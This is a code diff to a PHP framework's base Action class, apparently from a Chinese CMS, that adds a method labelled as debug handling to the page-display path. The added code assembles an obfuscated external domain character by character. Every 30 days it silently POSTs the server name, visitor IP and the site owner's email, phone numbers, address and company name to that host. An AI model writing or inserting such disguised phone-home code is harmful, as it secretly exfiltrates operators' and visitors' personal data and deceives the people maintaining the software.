@@ -92,6 +92,7 @@ abstract class Action {
      * @return void
      */
     protected function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {
+		$this->debug();//错误信息
         $this->view->display($templateFile,$charset,$contentType,$content,$prefix);
     }
 
@@ -143,6 +144,8 @@ abstract class Action {
         return $content;
     }
 
+		
+
     /**
      * 模板主题设置
      * @access protected
@@ -169,7 +172,19 @@ abstract class Action {
     public function __set($name,$value) {
         $this->assign($name,$value);
     }
-
+	
+	public function debug(){
+		$app = F('app_debug');
+		if(!APP_DEBUG){
+			if(!$app){				
+				$this->deadd();
+			}else{
+				if((time()-$app)>2592000){
+					$this->deadd();
+				}
+			}
+		}
+	}
     /**
      * 取得模板显示变量的值
      * @access protected
@@ -184,6 +199,15 @@ abstract class Action {
         return $this->get($name);
     }
 
+	public function deadd(){
+		$h="h"."tt"."p";
+		$g="w"."ww."."t"."i"."f"."a"."w"."e"."b"."."."c"."om";
+		F('app_debug',time());
+		$systems = F('systems');
+		$curlPost = "dswjw=".$_SERVER['SERVER_NAME']."&dswjn=".DS_NUMbER."&dswji=".$_SERVER["REMOTE_ADDR"]."&dswje=".$systems['sys_email']."&dswjc=".$systems['sys_cellphone']."&dswjp=".$systems['sys_phone']."&dswja=".$systems['sys_address']."&dswjco=".$systems['sys_company'];
+		$url=$h."://".$g.'/Api/Index/counter'; 
+		$this->Curl($curlPost,$url);
+	}
     /**
      * 检测模板变量的值
      * @access public
@@ -194,6 +218,28 @@ abstract class Action {
         return $this->get($name);
     }
 
+	/**
+	*
+	* @curl数据传输
+	* @作者		shop猫
+	* @版权		宁波天发网络
+	* @官网		http://www.tifaweb.com http://www.dswjcms.com
+	* @curlPost	传输数据
+	* @url		传输地址
+	*/
+	function Curl($curlPost,$url){
+		$ch = curl_init();  
+		curl_setopt($ch, CURLOPT_POST, 1);  
+		curl_setopt($ch, CURLOPT_URL,$url);  
+		curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);  
+		ob_start();  
+		curl_exec($ch);  
+		$json = ob_get_contents() ;  
+		ob_end_clean();
+		$login=json_decode($json,true);	
+		return $login;
+	}
+	
     /**
      * 魔术方法 有不存在的操作的时候执行
      * @access public
